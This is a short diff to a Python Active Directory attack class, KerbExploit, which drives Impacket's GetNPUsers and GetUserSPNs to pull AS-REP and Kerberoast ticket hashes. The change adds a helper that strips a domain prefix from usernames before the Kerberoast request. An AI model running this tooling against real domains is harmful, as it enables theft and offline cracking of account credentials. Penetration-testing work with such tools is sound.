@@ -301,6 +301,12 @@ class KerbExploit:
         print("==================== Attack AD =====================")
         print("====================================================\n")
 
+    def __strip_Domain_name(self,username:str)->str:
+        new_username = username.split("\\")
+        if(len(new_username) == 2):
+            return new_username[1]
+        return username
+
     def __RunImpacket(self,argProcess:list)->list:
         if(self.ipAddress != None):
             argProcess.append("-dc-ip")
@@ -339,7 +345,6 @@ class KerbExploit:
     def __ExploitASREP(self, username:str, outputFile:str)-> bool:
         isSuccess = False
         argProcess = [GetNPUsers,self.domainName+"/"+username,"-no-pass"]
-
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
@@ -352,7 +357,8 @@ class KerbExploit:
         if(username == None or password == None):
             argProcess = [GetUserSPNs,self.domainName+"/","-request-user",TargetService,"-no-pass"]
         else:
-            argProcess = [GetUserSPNs,self.domainName+"/"+username+':'+password,"-request-user",TargetService]
+            new_username = self.__strip_Domain_name(username)
+            argProcess = [GetUserSPNs,self.domainName+"/"+new_username+':'+password,"-request-user",TargetService]
         output = self.__RunImpacket(argProcess)
         for line in output:
             kerbHash = line.split('$')
